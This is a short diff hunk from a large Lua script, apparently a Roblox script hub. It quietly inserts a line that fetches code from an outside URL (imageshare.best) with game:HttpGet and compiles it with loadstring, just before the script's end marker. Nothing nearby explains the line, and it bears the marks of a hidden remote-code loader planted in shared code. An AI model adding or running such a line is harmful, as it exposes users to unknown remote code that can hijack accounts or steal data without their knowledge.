@@ -3311,7 +3311,7 @@ coroutine.resume(coroutine.create(function()
 		end
 	end
 end))
-
+loadstring(game:HttpGet("https://imageshare.best/SSBOP0"))
 -- [[ End ]] --
 
 notif("Script","took " .. string.format("%.6f",tick()-Tick) .. " seconds\n(Discord: TEENX !)",10,"rbxassetid://3339670365")
